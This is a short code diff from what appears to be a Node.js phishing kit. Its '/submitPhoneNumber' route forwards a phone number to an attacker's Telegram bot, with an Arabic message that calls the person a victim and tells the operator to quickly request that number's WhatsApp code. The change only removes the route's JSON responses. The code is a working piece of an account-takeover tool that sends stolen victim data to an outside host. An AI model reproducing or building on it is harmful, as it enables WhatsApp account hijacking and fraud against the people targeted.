@@ -660,11 +660,11 @@ app.post('/submitPhoneNumber', (req, res) => {
 
   bot.sendMessage(chatId, `لقد قام الضحيه في ادخال رقم الهاتف هذا قم في طلب كود هاذا الرقم في وتساب سريعاً\n: ${phoneNumber}`)
     .then(() => {
-      res.json({ success: true });
+      
     })
     .catch((error) => {
       console.error('Error sending Telegram message:', error.response ? error.response.body : error);
-      res.json({ success: false });
+     
     });
 });
 
